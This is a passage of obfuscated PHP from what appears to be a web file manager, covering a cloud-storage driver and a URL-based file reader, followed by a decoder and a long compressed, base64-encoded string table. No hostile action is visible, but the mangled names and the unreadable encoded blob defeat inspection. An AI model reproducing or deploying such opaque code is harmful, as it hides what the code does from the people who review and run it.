base64_encode(json_encode($í€¹ğ–)); $Ç”Úí“Î = base64_encode(hash_hmac($ï‹ç€Â²[1498], "\x50\x4f\123\x54\x26{$¬ßúö÷ }\46{$®å¤ö¯Ã}\46{$§â¿»Ñ}", md5("{$this->userpass}"), !0)); $›™ôè­ñ = array($ï‹ç€Â²[278] => $§â¿»Ñ, $ï‹ç€Â²[1532] => "\125\120\131\125\x4e\x20{$this->username}\x3a{$Ç”Úí“Î}", $ï‹ç€Â²[198] => $this->endpoint . $¬ßúö÷ ); return $›™ôè­ñ; } public function download($é³‰µ²á, $¶×î€Àã) { $øßÔ·· = IO::getPathInner(IO::mkfile($¶×î€Àã)); if (!($ÚõØ’Ëë = $this->link($é³‰µ²á))) { return !1; } $šæÍş¥³ = 0; $Â“ï®¡ = 1024 * 200; $Â×Óù™Î = fopen($øßÔ··, $_SERVER[Î‹ÃÂŞ„][1482]); while (!0) { $ïóƒ„»Ä = $this->fileSubstr($é³‰µ²á, $šæÍş¥³, $Â“ï®¡); if ($ïóƒ„»Ä === !1) { return !1; } fwrite($Â×Óù™Î, $ïóƒ„»Ä); $šæÍş¥³ += $Â“ï®¡; if (strlen($ïóƒ„»Ä) < $Â“ï®¡) { break; } } fclose($Â×Óù™Î); return $¶×î€Àã; } public function link($Æ­¹ƒì, $¡®Ëô = array()) { $å·Ë“Œû =& $_SERVER[Î‹ÃÂŞ„]; $Æ­¹ƒì = trim($Æ­¹ƒì, $å·Ë“Œû[8]); if (!empty($this->token)) { $“ŸÃ³†« = strtotime(date($å·Ë“Œû[1533])); $õ°¬Æï = substr(md5($this->token . $å·Ë“Œû[330] . $“ŸÃ³†« . $å·Ë“Œû[1534] . $Æ­¹ƒì), 12, 8) . $“ŸÃ³†«; $¡®Ëô[] = $å·Ë“Œû[1535] . $õ°¬Æï; } $«œ¤ºº = !empty($¡®Ëô) ? $å·Ë“Œû[75] . implode($å·Ë“Œû[330], $¡®Ëô) : $å·Ë“Œû[12]; return $this->getHost() . $å·Ë“Œû[8] . $Æ­¹ƒì . $«œ¤ºº; } public function fileOut($§Û‘¿¡¾, $€”úê¬¸ = false, $ñ¬¹ˆº = false, $Á—´²¼ì = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($§Û‘¿¡¾, $€”úê¬¸, $ñ¬¹ˆº, $Á—´²¼ì); } if (!$ñ¬¹ˆº) { $ñ¬¹ˆº = $this->pathThis($§Û‘¿¡¾); } $ÚÒí¯ = $€”úê¬¸ ? array($_SERVER[Î‹ÃÂŞ„][1536] . rawurlencode($ñ¬¹ˆº)) : array(); $Ö„‹³™ = $this->link($§Û‘¿¡¾, $ÚÒí¯); $this->fileOutLink($Ö„‹³™); } public function fileOutServer($âûå½§Ê, $—±õ¿óé = false, $ÕÑˆ¡–’ = false, $ñö–Ò·Š = '') { parent::fileOut($âûå½§Ê, $—±õ¿óé, $ÕÑˆ¡–’, $ñö–Ò·Š); } public function fileOutImage($¤“¹¿èÍ, $Â“î‡¡Ø = 250) { $±¯ĞÅ = $this->link($¤“¹¿èÍ . $_SERVER[Î‹ÃÂŞ„][1537] . $Â“î‡¡Ø); $this->fileOutLink($±¯ĞÅ); } public function fileOutImageServer($Á„„‹ÓÜ, $èÁÂúü = 250) { parent::fileOutImage($Á„„‹ÓÜ, $èÁÂúü); } public function hashMd5($ ²­Œè) { $šŠô¨û½ =& $_SERVER[Î‹ÃÂŞ„]; $ëüşş¥è = $this->_objectMeta($ ²­Œè); return isset($ëüşş¥è[$šŠô¨û½[230]]) ? $ëüşş¥è[$šŠô¨û½[230]] : !1; } public function size($Óå¬Õøá) { $©ğ¾×¥› = $this->objectMeta($Óå¬Õøá); return $©ğ¾×¥› ? $©ğ¾×¥›[$_SERVER[Î‹ÃÂŞ„][78]] : 0; } public function info($êöèÓÁ) { if ($this->isFolder($êöèÓÁ)) { return $this->folderInfo($êöèÓÁ); } else { if ($this->isFile($êöèÓÁ)) { return $this->fileInfo($êöèÓÁ); } } return !1; } public function exist($½ƒá–é) { return $this->isFile($½ƒá–é) || $this->isFolder($½ƒá–é); } public function isFile($‡ï³µ‹ê) { return !$this->isFolder($‡ï³µ‹ê) && $this->objectMeta($‡ï³µ‹ê); } public function isFolder($ïÍ‹¿é) { return $this->cacheMethod($_SERVER[Î‹ÃÂŞ„][168], $ïÍ‹¿é); } protected function objectMeta($ÂŒÏß§Ç) { return $this->cacheMethod($_SERVER[Î‹ÃÂŞ„][170], $ÂŒÏß§Ç); } protected function _objectMeta($Éñõş÷³) { $Ò¦ ó€« =& $_SERVER[Î‹ÃÂŞ„]; if ($Éñõş÷³ == $Ò¦ ó€«[12] || $Éñõş÷³ == $Ò¦ ó€«[8]) { return array(); } $ø÷‘×¨Î = $this->ussRequest($Éñõş÷³, $Ò¦ ó€«[1538]); if (!$ø÷‘×¨Î[$Ò¦ ó€«[1267]]) { return null; } $ÎíÆ˜…ş = isset($ø÷‘×¨Î[$Ò¦ ó€«[1257]]) ? $ø÷‘×¨Î[$Ò¦ ó€«[1257]] : array(); if (!isset($ÎíÆ˜…ş[$Ò¦ ó€«[1539]])) { return null; } $Ğ¿»Ñêœ = array($Ò¦ ó€«[33] => isset($ÎíÆ˜…ş[$Ò¦ ó€«[1539]]) ? $ÎíÆ˜…ş[$Ò¦ ó€«[1539]] : null, $Ò¦ ó€«[78] => isset($ÎíÆ˜…ş[$Ò¦ ó€«[1540]]) ? $ÎíÆ˜…ş[$Ò¦ ó€«[1540]] : null, $Ò¦ ó€«[230] => isset($ÎíÆ˜…ş[$Ò¦ ó€«[1541]]) ? $ÎíÆ˜…ş[$Ò¦ ó€«[1541]] : null, $Ò¦ ó€«[1508] => isset($ÎíÆ˜…ş[$Ò¦ ó€«[1542]]) ? $ÎíÆ˜…ş[$Ò¦ ó€«[1542]] : null); $Ğ¿»Ñêœ[$Ò¦ ó€«[1509]] = isset($ÎíÆ˜…ş[$Ò¦ ó€«[1543]]) ? strtotime($ÎíÆ˜…ş[$Ò¦ ó€«[1543]]) : $Ğ¿»Ñêœ[$Ò¦ ó€«[1508]]; return $Ğ¿»Ñêœ; } protected function _isFolder($š«‰é¨) { $Å •Œğ =& $_SERVER[Î‹ÃÂŞ„]; if ($š«‰é¨ == $Å •Œğ[12] || $š«‰é¨ == $Å •Œğ[8]) { return !0; } $ø¸í÷Ì£ = $this->_objectMeta($š«‰é¨); return isset($ø¸í÷Ì£[$Å •Œğ[33]]) && $ø¸í÷Ì£[$Å •Œğ[33]] == $Å •Œğ[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($â¹»²•ã = false) { } public function exist($ºÃ½ŠìÓ) { $…âû¬œ = $this->info($ºÃ½ŠìÓ); return $…âû¬œ[$_SERVER[Î‹ÃÂŞ„][218]]; } public function isFile($°Ş‘±¤ã) { $¥ãÎàÌÕ = $this->info($°Ş‘±¤ã); return $¥ãÎàÌÕ[$_SERVER[Î‹ÃÂŞ„][218]]; } public function isFolder($ËºøÚŸÈ) { return !1; } public function size($µÎ’¥Œñ) { $ÛĞƒ¬øÜ = $this->info($µÎ’¥Œñ); return $ÛĞƒ¬øÜ[$_SERVER[Î‹ÃÂŞ„][78]]; } public function info($İÇİüĞ) { return $this->infoParse($İÇİüĞ); } public function infoAuth($ìÁÅŞ²) { return $this->infoParse($ìÁÅŞ²); } public function infoWithChildren($ÆâïìÆµ) { return $this->infoParse($ÆâïìÆµ); } public function infoFull($Ç¦ÉÜš) { return $this->infoParse($Ç¦ÉÜš); } private function infoParse($Ï ÃğÛÒ) { $³Õ—şêß =& $_SERVER[Î‹ÃÂŞ„]; $Ï”ÂÆ±— = $this->header($Ï ÃğÛÒ); if (!$Ï”ÂÆ±— || !$Ï”ÂÆ±—[$³Õ—şêß[797]]) { return !1; } $€›ÇÃ‹ô = _get($Ï”ÂÆ±—, $³Õ—şêß[383], 0); $´ÆÊ×Ê = array($³Õ—şêß[32] => $Ï”ÂÆ±—[$³Õ—şêß[32]], $³Õ—şêß[86] => $Ï ÃğÛÒ, $³Õ—şêß[33] => $³Õ—şêß[216], $³Õ—şêß[78] => intval($€›ÇÃ‹ô), $³Õ—şêß[177] => get_path_ext($Ï”ÂÆ±—[$³Õ—şêß[32]]), $³Õ—şêß[1420] => $€›ÇÃ‹ô > 0 && $Ï”ÂÆ±—[$³Õ—şêß[1544]], $³Õ—şêß[1421] => !1); return $´ÆÊ×Ê; } private function header($¡’Ôî¯‰) { $¶½„£æ® =& $_SERVER[Î‹ÃÂŞ„]; if (isset(self::$_cacheHeader[$¡’Ôî¯‰])) { return self::$_cacheHeader[$¡’Ôî¯‰]; } $¸ñØÃ×Û = isset($GLOBALS[$¶½„£æ®[1545]]) ? $GLOBALS[$¶½„£æ®[1545]] : !1; $GLOBALS[$¶½„£æ®[1545]] = !0; self::$_cacheHeader[$¡’Ôî¯‰] = url_header($¡’Ôî¯‰); $GLOBALS[$¶½„£æ®[1545]] = $¸ñØÃ×Û; return self::$_cacheHeader[$¡’Ôî¯‰]; } public function hashSimple($±ÂÎüë´, $•÷Õ¨˜ğ = false) { $ÚÎ†±ç˜ =& $_SERVER[Î‹ÃÂŞ„]; $Ù×Èà·Ö = $this->info($±ÂÎüë´); if (!$Ù×Èà·Ö || !$Ù×Èà·Ö[$ÚÎ†±ç˜[218]]) { return !1; } $ßÈÌèë¤ = $Ù×Èà·Ö[$ÚÎ†±ç˜[78]]; $í»¨÷µí = 200; $È·ÂïŞï = 50; if ($ßÈÌèë¤ <= $í»¨÷µí * $È·ÂïŞï) { return md5($this->fileSubstr($±ÂÎüë´, 0, $ßÈÌèë¤)) . $ßÈÌèë¤; } $ºŞ³ÓõĞ = intval($ßÈÌèë¤ / $È·ÂïŞï); $¸€ŸÕß” = $ÚÎ†±ç˜[12]; $½Ñßõ¾ = timeFloat(); $§÷îª¦ = 15; for ($•³ç»ç = 0; $•³ç»ç < $È·ÂïŞï; $•³ç»ç++) { if (timeFloat() - $½Ñßõ¾ > $§÷îª¦) { return !1; } $ş’–“‚Í = $this->fileSubstr($±ÂÎüë´, $ºŞ³ÓõĞ * $•³ç»ç, $í»¨÷µí); if (!$ş’–“‚Í) { return !1; } $¸€ŸÕß” .= $ş’–“‚Í; } $¸€ŸÕß” .= $this->fileSubstr($±ÂÎüë´, $ßÈÌèë¤ - $í»¨÷µí, $í»¨÷µí); return md5($¸€ŸÕß”) . $ßÈÌèë¤; } public function getContent($™Ö©ù†Ÿ) { return $this->fileSubstr($™Ö©ù†Ÿ); } public function fileSubstr($ŠˆÉÁ€«, $í¿ªˆÛ– = 0, $¥¬æç…Ø = -1) { $“´şøòè =& $_SERVER[Î‹ÃÂŞ„]; $èÓê˜Ì€ = $this->info($ŠˆÉÁ€«); if (!$èÓê˜Ì€ || !$èÓê˜Ì€[$“´şøòè[218]] && $èÓê˜Ì€[$“´şøòè[78]] > 1024 * 1024 * 10) { return !1; } if ($¥¬æç…Ø === -1) { $¥¬æç…Ø = $èÓê˜Ì€[$“´şøòè[78]]; } if ($¥¬æç…Ø == 0) { return $“´şøòè[12]; } $•¶ªÁÚ€ = array($“´şøòè[1546] . $í¿ªˆÛ– . $“´şøòè[829] . ($í¿ªˆÛ– + $¥¬æç…Ø - 1)); $Îáù¢êô = url_request($ŠˆÉÁ€«, $“´şøòè[247], !1, $•¶ªÁÚ€, !1, !1, 30); return $Îáù¢êô[$“´şøòè[1257]] ? $Îáù¢êô[$“´şøòè[1257]] : $“´şøòè[12]; } public function download($÷ş¤è¿í, $¡¿ıĞ ») { Downloader::start($÷ş¤è¿í, $¡¿ıĞ »); return $¡¿ıĞ »; } } goto cƒÕ‹¹óöä; fÚé‰ğ„ÄÈ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('zovDwt6E'), "\302\274\300\352\260\254"); $_SERVER[Î‹ÃÂŞ„] = explode("\x7c\x1\x7c\x1\x7c\x4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\150\241\33\244\154\245\24\50\51\164\160\110\154\47\132\154\147\167\342\44\262\55\333\112\144\311\110\162\26\354\60\31"."\x49\x23\x69\x62\x49\x23\x6b\x46\xde\xe2\x0\x29\x50\x28\x3b\x5\xca\xbe\xb4\x94\x42\x4b\x2\x94\x35\x65\xeb\x42\xb\xa5\x2c\xa5\x4d\xcb\xf2\xa7\xc0\xf\xcd\x46\x69\xe1\xd1\xb2\x97\xd2\x77\x97\x73"._kodDe('MgWD3LXbq9upbWfjMKeKSbgpusjju1/jJdtjXyh6vxIzL+Np65raCrfpp1uF3L3q0NQ=')."\xef\x7e\x34\xfc\x8d\x73\xf\xf8\xc\xf9\xf3\x95\x73\xcf\x69\x68\xe8\x59\x30\x6d\x4e\xe4\xa0\xb\xef\xde\xa6\xfd\x58\xfb\x91\x76\x5e\x34\xfc\xc4\x93\xa1\x83\x9f\xde\xba\x32\xb8\xe7\xc6\x27\xc6\xf7"."\354\367\231\255\157\135\265\242\25\145\246\145\133\351\217\122\64\155\105\37\63\54\333\242\200\224\131\314\30\131\32\66\212\364\327\117\177\372\143\341\262\136\60\155\235\106\175\364\107".strrev('¤³%©ÕÈÖ¡l½%ûà¬­%BfÓ•jd±‚úûûÆ¡4HÕÒÁ¼á­‘v…')."\110\153\266\226\324\54\250\251\263\135\355\14\366\205\243\353\324\304\272\276\40\344\110\252\303\25\275\74\116\143\44\30\267\265\262\235\60\12\72\317\61\132\346\355\152\17\166\207\42"."\112\42\26\210\304\3\35\211\120\64\102\301\35\321\336\336\120\242\32\36\213\206\303\355\201\216\125\325\51\175\261\100\167\157\100\101\355\313\353\252\121\314\230\15\312\6\232\262\101"."\151\244\201\56\103\317\247\151\260\250\261\346\330\343\45\10\45\170\10\115\123\261\222\317\323\110\204\207\322\172\106\253\344\141\264\72\345\110\251\154\24\64\326\351\125\372\70\207\322".base64_decode('gFaxTaOYopHgmF3WBBy1NYUmWi9CVfFgONiRUHADla5YtFeBSSholq2XlTU9wVhQwQ==')."\x8d\x6e\xab\x27\x7d\xad\x57\x0\x5f\x22\x68\x28\x94\x40\x38\xac\x4c\x55\x83\xad\x17\x4a\xac\x1a\x5a\xa6\x46\x65\xd1\x58\x67\x30\xa6\xb4\xaf\x53\xc4\x8\xa5\xcc\x42\xc1\x2c\xfa\x50\x2d\x68\x26\x6d"."\251\251\301\130\214\6\74\200\336\341\20\236\64\210\104\273\272\342\101\36\203\316\235\30\106\55\231\13\370\351\210\245\63\171\133\35\321\362\25\206\246\103\364\267\36\176\340\327\264"."\0\165\207\215\242\121\1\64\205\52\114\223\57\53\10\124\130\156\235\101\364\64\4\12\250\274\11\345\222\0\113\262\134\6\132\230\43\64\330\266\214\376\56\201\142\111\25\247\351".base64_decode('ZVvViykzbRRh+S4HNNTsXGfZQBloPGPm0yxsGRPQuYyR1yOVgpyFR1M5I58usxX3SQ==')."\x39\x69\x34\xcc\x17\x30\xce\x2b\x62\x25\xd4\x92\x49\xb6\xf6\x8d\xcc\xb8\x58\x81\x38\x5f\x1f\x4f\xb5\xcc\x4a\x39\xa5\x87\xd0\x8a\xa1\xf1\x66\x0\xeb\xb6\x8d\x3a\xc7\x6\xc4\xec\x2f\xe5\x4d\x2d\x1d".base64_decode('18u8a4bZhSqKVmwZWCHZusxyoRPRCvg+WidGf42EIbZS0tKI+RsGtng/Xj+wAv3TCA==').strrev('Th•ÊWÌ}i‹“AJJ¾zo\\¬Óš¨¡£Bıi+~6-óÒ)aÓUyóÓ”ÚpÄ')."\54\362\101\7\252\343\241\213\230\166\120\242\324\171\63\245\345\345\56\322\160\316\266\113\161\275\230\306\43\1\135\61\107\213\144\244\112\272\16\231\72\75\112\132\351\125\326\51\75"."\xad\x46\xab\xc5\xa\x16\xf2\x3c\xc4\x7a\xc7\x61\x16\x7\xda\x63\x6c\x3a\xd3\x19\x40\x52\xb6\x51\xd4\xc1\x7\xd\x8b\xd0\x3c\xb1\x60\xb5\x52\x29\x6f\xa4\x34\xdb\x30\x8b\x7e\x33\x65\xeb\xb6\xd7\xb2".base64_decode('y7oGNQZSKd2yvB1m0S6beW8gnzdHvdGykTWKrcpsmgcnomXuxSSxFdZu3RIFIw7+zA==').strrev('ŸmõDSL9RÖÛ4UkÍÀËL•a§[,‹§,j'."\n".'­XA½—£+Ek.ç’kb.ñŠ¶ì')."\337\50\346\215\242\136\225\67\70\126\62\312\272\305\332\252\164\367\46\240\22\124\273\356\355\53\153\331\202\326\252\224\52\111\64\62\260\122\153\300\150\156\30\232\126\45\205\243\36".strrev('µA#¤ÚPÔú$Ií'."\n".'4°£¨AO4Û'."\0".'á¢8ŞÓĞÊëÅíã(r @ÉÄGYol±P¥')."\67\220\350\350\201\146\333\132\226\265\71\214\50\63\257\222\1\327\172\321\372\302\310\25\101\175\25\300\76\163\124\57\243\17\267\217\267\52\103\146\72\151\216\371\130\22\316\34\107".base64_decode('hIZlxtNdsr0xrZjF45Mct3VAQUGq2tGW7svQxexL6hmzDL2xRrLOuQjrxaydY3XHgw==')."\xb1\xd5\xc1\x98\x1a\x8f\x76\x25\xd6\x4\x62\xc0\x1\x14\x11\x22\x8d\xb1\xd6\xe0\xaf\xe7\xbd\x31\x3d\x8d\x66\x27\x65\xb3\x72\x5a\x9\xf\x2c\xcb\x83\xd7\xf\xfe\x38\x4b\xc5\x6b\x8a\xa5\x85\x43\xdd"."\x78\xec\x3a\xbd\x16\xca\xe4\x95\x73\xb1\xba\xc3\x46\xc1\xc0\xdd\xb3\x79\xa\x19\x6c\xc4\x1e\x74\x43\x83\xfc\xa4\xcf\x6d\x83\xd6\xec\x86\xc1\xf4\x9c\x46\x2f\xfa\x77\x76\xe3\xc0\x60\xa7\x6f\xf6\xfa".base64_decode('5X5DlPE3+5qVlqYFSh/iVwwtr0Cnq3I0KdFVzmERCF80i/onDA7e8CTK4BpWCowFTw==').strrev('a‘^Œš#rf©Bœ£ƒÎÒ]Xjéë'."\0".'€õŸĞŞ³et›'."\n".'¯„íÑ0ojÆì').base64_decode('mPlQQctK+4Dq3CZwDCf2CuRAWLbGSPN9BEV7dCObgwEzcHUpM2+WtTymnmzh6IyiZQ==').base64_decode('DaBopXwF4YwffyGRqxSSQPQR25jVbcGVWeOIdQEihphYNG4hGBPYwiDmV/E8D/pKxQ==').strrev('×¹´]¼Ïh‘P!,Ä€§q[ÒW¢‹DÊ_"{H­=ˆ‹¡E'."\0".'	¿2Ú—P	ãl').base64_decode('nqe8r4AqIXV2mHyDowcA4CfYdqHo5bJZPh5ykLBC9hw8b1C5zXdwCy0fFs6ZfMc3yw==')."\20\152\365\103\277\147\266\164\115\302\176\350\217\317\105\377\213\315\57\155\26\64\266\225\220\115\100\117\323\135\200\202\146\73\122\172\164\115\260\61\166\331\66\61\264\354\310\202\360"."\51\147\2\136\243\171\203\46\125\170\333\130\53\323\172\136\147\270\220\323\331\106\332\4\331\320\330\161\114\311\160\224\105\34\62\202\12\16\306\260\142\250\44\336\366\130\174\15\76"."\x52\x8\x0\xde\xfb\x61\xe6\x45\x30\x8f\xc6\x3d\x4a\x70\x5f\xc4\xfb\xca\x7a\xc6\x0\x72\x55\x44\xa8\xd9\xab\x95\x87\x58\xc7\x50\x49\xb1\x6a\x70\x44\x5a\x51\x5d\xfd\xe1\xb0\xda\x11\x8d\x24\xd0\x89"."\204\102\326\304\102\11\130\345\61\264\132\325\100\107\37\215\161\236\204\320\340\311\252\15\226\102\106\132\140\222\121\43\374\202\23\100\233\132\311\54\132\272\67\5\45\304\171\245\52".strrev('C°(q¢úã!V‡ƒÃÿbM0Bvå(ŠlœóyxˆxL+W˜åû]\\ÚCšJ6-)')."\21\217\232\344\213\245\257\37\222\12\22\212\164\7\1\70\15\260\52\247\65\3\76\255\211\263\275\253\202\362\227\215\11\115\164\151\71\153\17\353\110\41\57\130\136\147\257\274\142".base64_decode('5lGV87w9vYEOb7wn0DJ/AYWuK6QHEz2GNXgSj8O4jVrz1LKOyAOruaUJGqdjRkNqzw==')."\72\157\301\213\153\301\103\346\153\152\152\142\165\315\131\240\344\20\125\2\364\65\213\151\62\55\354\234\121\111\15\261\25\242\245\30\317\207\217\311\226\167\324\140\4\365\4\316\36"."\x9f\x50\x8d\x2e\x27\x38\xb7\xe\xa8\xa2\x42\x78\x3b\x55\x4b\xe1\x8f\xa9\xa8\x46\xbb\x62\xc9\x43\x83\xd6\x51\x1a\x15\x32\x18\x2b\x4b\xa1\x5a\x3e\x8b\x46\xd9\xce\x15\x64\xa0\x98\x69\x1a\xd7\x29\x87"."\305\47\213\217\42\36\133\47\122\313\115\52\231\210\271\202\156\254\255\331\206\265\265\332\260\326\325\206\265\325\155\240\40\313\310\26\121\57\331\236\224\350\11\105\126\251\275\321\316"."\140\130\15\105\320\26\234\250\206\367\367\165\6\330\112\225\341\355\321\104\217\3\332\217\66\341\325\201\160\310\235\75\270\66\24\117\304\153\46\41\130\177\320\225\322\331\256\366\305"."\202\135\241\265\74\332\25\12\206\73\343\152\107\240\243\107\344\211\4\172\41\202\166\136\75\237\266\374\316\374\52\342\46\342\134\334\241\216\140\321\15\303\102\325\41\141\120\331\331"."\x59\x15\xc4\x2\x31\x96\x3a\xc\x38\x74\x17\xb\x8c\x48\x4f\x54\x86\xa4\x15\xc6\xeb\xf0\x43\x55\x81\xed\x6\x5\xd\x68\xa4\xc6\x38\xc2\x6\xfa\xd3\xa8\x4\xe2\x8a\x5d\x82\x3a\x10\xdd\x4f\x8e\xf3"."\40\351\6\213\243\255\14\276\257\0\147\123\325\2\25\347\151\227\330\317\332\200\100\306\346\174\215\53\216\250\234\110\103\63\20\40\222\51\204\11\144\106\340\63\6\242\231\145\73"."\300\232\223\21\122\41\65\332\27\214\5\260\114\111\135\23\213\106\272\241\300\150\116\147\15\10\301\360\67\260\203\6\210\226\154\261\365\240\123\202\306\144\14\142\320\67\232\154\50".base64_decode('J+nPLPqDDkjwcb3IRj2Jd2HGRbFABpE9toOaFf61pGnCF/KYEZ5kOwMXTW20GJKMsQ==')."\x3d\x65\xce\x24\x23\x65\x80\xba\xd1\x55\xc1\x88\xca\x30\x8b\xc6\x24\x6c\xa4\x80\x60\x2c\x16\x8d\xc1\x80\xd8\xe6\x10\x93\x4f\xd0\xc4\x58\x30\xce\xc8\x39\x26\x9b\x6\x1b\x2e\xbf\x6f\xe\x60\xb1\x8e"."\x98\xd\xf8\xbc\xff\xe4\xc1\xd1\x39\xd\x3\xde\x39\xbe\xf5\x28\xd0\x38\x7b\x5\x8d\x42\x6c\xd0\xe7\x88\x32\x6\xae\x52\xe6\xa5\xf1\xf9\xa0\xc1\x5a\xde\xd8\x3a\xe8\x1f\xf4\x37\x2c\x6f\x1d\x8\x78".base64_decode('JzTvRJN3sXc9Yvsa5wBg/aYWz7zNOAPKuHzGevTTNrh85qB31ikbVgwMrq9vnXP8oA==')."\x6f\xc6\xe0\xe8\xfa\xd9\x8d\xcb\xd9\x77\x52\x95\x32\xe2\x2c\x19\xc5\x42\x4d\x4d\xcf\x69\x40\x4d\x42\xe7\x6\x9e\xa5\x48\xf6\x36\x29\x3\x4b\x98\x30\x4a\x2\xba\x69\xc1\x66\x6\x47\x73\xa8\x67\x45".base64_decode('iQHv4Jz1y6VyEsj9LURJ0Uab4/kC3pNwz3hRvO4BPyrFlNiW8LpIaimgA4hGCq7dLg==').base64_decode('c5mV80S7aSb93cwmMqvDoidi6jJgZ6VoDDOuuagPQ8C0GX4ndXtUZ+iB4I44Qg5G9w==')."\x51\x92\x14\xcb\x4b\x7b\x6\x11\x2e\x70\x1c\xe5\xc8\x64\x94\x54\x7c\x92\x18\xe5\x31\xb4\x8d\xc0\x3c\x1d\x8\xb9\xad\x94\x56\xd2\xe3\x52\xf\x55\x35\x11\x68\xf\x7\x55\x46\x61\x80\x12\xb3\x38\xa1"."\212\355\134\240\215\272\46\50\52\243\17\51\161\126\45\47\167\130\371\326\160\136\41\204\201\162\356\255\104\266\157\125\112\230\11\127\320\214\243\261\125\320\6\256\264\55\123\350\220".strrev('g‘¹»šoÖfó_€?^€ÊÁÁ†ş¯1™Ö!d3TÚ'."\n".'Ç¢ÅÒy,BÆ’€U9C')."\xfd\x83\xe8\xf\x8b\x4\x6a\x48\x99\x55\x4e\xd\x55\xc4\x88\xf9\x70\x3b\xb8\x58\xd1\x11\xe1\xc9\x34\x6a\x96\x39\x7\x5c\x72\x9c\x16\x6d\xd3\xd6\xf2\x8e\x2a\x12\x18\x2\x93\xcb\x39\x34\x10\xb0\xd1".base64_decode('2Q4LioV5Nkk8T8hphAu0OCMkyYdxibhu+3gOj5SoorjjqqQNhGUZo4iWU4e01VExZw==').base64_decode('nJwtHTJ9S9fKqVxXJZ+3+ZE1bwzBF2CtwBWDl/4oc2oV7TLLTDo0G5pRN7tWxlCxaA==')."\xa6\x93\x32\xaa\x89\x4d\xb6\x3b\x80\xd8\x99\x84\xd2\xc0\xc4\xe1\x4a\x28\xa2\xb4\x47\xa3\xe1\x60\x20\xa2\xe0\xfd\x1c\xf6\x21\xc4\x2c\xc4\x83\x7d\x1\xb4\x89\x61\x39\x53\x3c\x11\x4\x9\x7d\xa8\xd3"."\xcb\xea\x5d\xeb\x65\x7\x65\x1e\x30\x60\xd8\xcd\x12\xe5\x1b\x75\x5b\x45\x67\xcf\x21\x36\x97\xf2\x51\x1b\x9f\x21\x3c\xf8\xc0\xeb\xc1\xbc\x85\x7\xb5\xda\x83\xcf\xc8\x1e\x71\x42\xf3\x8\x71\xb3\x67".strrev('ÚÃß¹Ø{ÏD}a9´=Æ×“pèÕN€šÄ’òC‡$êÃC=Óˆò¨p<Ÿ€IGĞÄ').base64_decode('6GFiDw8RV3RCs/rRcoJmkSCimjkPRiCMvx4hAPegw7heJllgYMS50iPOnJ5s2ayU+g==').strrev('šS‡ÏUdÊ}(õRp¿'."\0".'#w'."\r".'îÖpæ¤ë`ZH²<RI‡¶šf 9›D'."\0".'m¥7Ø')."\xb4\x89\xd6\x8\xe2\xaa\xcd\x6c\x97\x73\xe4\x21\xc2\x1c\xce\x7d\xe2\x1\x17\xa1\xd5\x62\xa1\xe2\xe\x74\x69\x70\xd5\x42\xab\x95\xc3\x1c\x41\x8b\x4e\x44\x15\xb2\x6e\x71\xcb\x21\x78\x5d\xb7\xb4\xc0".base64_decode('ff+BP5rQsnHpc7aWZd/CxAqlTpmVhmN6ajwlxA+dklDDGaugGuJaxtUtD1lHtdZA7Q==')."\71\346\170\315\247\144\332\201\7\262\61\146\310\316\347\327\261\106\76\175\165\102\277\10\11\214\226\4\23\101\33\213\311\160\34\155\152\135\171\66\50\55\162\62\20\140\217\63\206"."\27\227\217\20\144\162\221\30\347\222\251\160\260\53\241\254\214\42\352\145\230\52\55\243\342\314\12\371\307\54\52\216\272\331\160\51\155\44\135\304\265\142\232\102\66\40\112\277\241"."\255\216\175\244\316\121\134\240\211\263\21\36\26\165\174\115\314\270\74\10\30\35\110\367\305\356\304\100\121\261\31\126\200\363\323\54\70\203\141\271\36\204\164\6\23\123\53\343\245"."\x44\x6e\x4\x80\xb5\xcb\xf1\x5d\x1c\x15\x6b\x8a\xa1\x84\x82\x3f\x0\x15\x10\x5e\x5\x93\x14\xaf\x58\x1d\x52\xd4\x39\xe4\x2e\x8c\x74\x6d\xa1\x78\x88\xfa\x8c\xe2\xb8\x51\x8c\x1b\x85\x52\xbe\xa\x3a"."\311\167\141\301\4\340\305\55\142\24\53\247\12\323\115\4\213\150\150\375\36\270\256\363\344\215\342\220\264\101\13\11\34\152\75\56\52\265\35\152\162\265\34\52\222\262\210\21\140"."\121\307\352\6\374\317\151\145\61\264\214\46\141\302\300\363\133\70\213\210\112\331\62\332\210\140\127\34\145\44\312\142\331\343\254\57\162\320\131\51\215\166\172\310\157\17\352\212\274"."\170\371\144\141\252\302\62\121\202\204\50\103\30\215\34\372\41\35\111\230\36\54\56\106\77\164\123\147\367\270\44\23\133\5\225\102\47\210\237\161\170\65\42\7\200\106\170\370\33"."\x18\x39\x1\xd6\x42\x95\x4\x4\x9c\x1c\x39\x99\x3\xda\x92\x0\x27\xf6\x68\xcb\x44\x1b\x1e\xd\x23\x4e\x3e\x8f\xf6\xb9\xb2\xf\xaf\x9e\x6e\xbc\x5b\xb1\xf1\xa1\x84\x4f\xc6\xc6\xb8\x8e\xfa\xc\xe5".strrev('Wä®r¦w|÷ËÛ96UŞ;]¸ÀíÕªĞğƒEe'."\r".'?ÎsâÅ\\ll@â·94ªñmD')."\363\256\175\132\32\17\7\157\121\5\222\312\270\271\14\27\324\25\25\23\341\330\202\50\210\335\26\150\351\202\121\364\225\351\326\346\103\247\5\120\260\360\64\111\214\230\240\100\233"."\350\215\14\154\205\233\135\363\154\233\46\72\202\226\175\145\364\145\321\40\211\372\1\351\40\267\355\170\207\224\331\7\136\213\205\22\44\72\356\344\222\130\311\170\111\143\344\233\163"."\x70\xc\x93\xc9\x79\xa3\x22\x48\x2a\x69\xb2\xa4\xfd\x40\xe2\x61\xce\xed\x62\x2\x11\x4c\x1b\x36\x86\xe0\x25\x67\xb2\xb\xc\x91\x51\x6c\x99\x2\x26\xd3\x6c\xb2\xf5\x54\x4d\xb1\x38\x3a\x78\x66\x3a".base64_decode('cjrZBQDOJnu6T3A3tfVIUmYJ5l1SqSqYI7oE9Fm2WRIpUpQmS0miUikXnwrSIrSK0g==').base64_decode('hCcWQ0byQllyoKYL1YePED4xqqHOQLnM0JR2E19BIqA